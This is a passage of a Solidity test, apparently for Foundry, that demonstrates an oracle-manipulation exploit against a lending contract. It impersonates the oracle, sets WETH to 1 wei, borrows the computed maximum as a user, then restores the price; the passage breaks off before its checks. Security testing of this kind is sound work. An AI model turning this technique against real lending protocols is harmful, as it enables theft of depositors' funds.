    function test_exploit_via_oracle_manipulation() public {
        // Record normal collateral value and max borrow value
        uint256 collateralValueNormal = lending.getCollateralValue(100 ether);
        uint256 maxBorrowValueNormal = collateralValueNormal * 100 / 175;

        // Manipulate oracle: set WETH price to 1 wei (extremely low)
        vm.prank(address(oracle));
        oracle.setPrice(address(weth), 1, block.timestamp + 1 days);

        // Calculate borrowable amount with manipulated oracle
        uint256 currentBorrowValue = lending.getBorrowValue(0);
        uint256 collateralValueManipulated = lending.getCollateralValue(100 ether);
        uint256 maxBorrowValueManipulated = collateralValueManipulated * 100 / 175;
        uint256 availableBorrowValueManipulated = maxBorrowValueManipulated - currentBorrowValue;
        uint256 lpTokenPrice = lending._getLPTokenPrice();
        uint256 amountToBorrow = availableBorrowValueManipulated.divWadDown(lpTokenPrice);

        // User borrows maximum amount
        vm.startPrank(USER);
        lending.borrow(amountToBorrow);
        vm.stopPrank();

        // Reset oracle to normal prices to reveal true state
        vm.prank(address(oracle));
        oracle.setPrice(address(weth), 1e18, block.timestamp + 1 days);

        // Check true collateral and borrow values
